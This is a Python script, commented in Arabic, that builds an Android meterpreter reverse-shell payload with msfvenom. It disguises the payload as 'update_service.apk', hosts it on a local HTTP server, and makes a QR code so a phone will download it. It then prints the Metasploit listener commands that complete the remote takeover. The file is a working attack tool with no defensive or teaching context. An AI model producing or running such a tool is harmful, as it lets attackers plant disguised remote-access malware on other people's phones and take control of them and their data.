import os
import qrcode
import socket

def get_ip():
    # كود لجلب IP جهازك تلقائياً
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def setup_environment():
    ip = get_ip()
    port = "4444"
    filename = "update_service.apk"
    
    print(f"--- [ My Local IP: {ip} ] ---")
    
    # 1. إنشاء البيلود
    print(f"\n[+] Generating Payload: {filename}...")
    cmd_payload = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {filename}"
    os.system(cmd_payload)
    
    # 2. إنشاء الباركود
    print(f"[+] Creating QR Code...")
    link = f"http://{ip}:8000/{filename}"
    qr = qrcode.make(link)
    qr.save("connect.png")
    
    # 3. عرض التعليمات
    print("-" * 40)
    print(f"DONE! Scan 'connect.png' to download.")
    print("-" * 40)
    print("\n[!] Now, follow these steps in separate terminals:")
    print(f"1. Run Server: python3 -m http.server 8000")
    print(f"2. Run Listener in Metasploit:")
    print(f"   - use exploit/multi/handler")
    print(f"   - set payload android/meterpreter/reverse_tcp")
    print(f"   - set LHOST {ip}")
    print(f"   - set LPORT {port}")
    print(f"   - exploit")
    print("-" * 40)
    
    # فتح صورة الباركود تلقائياً
    os.system("xdg-open connect.png")

if __name__ == "__main__":
    setup_environment()
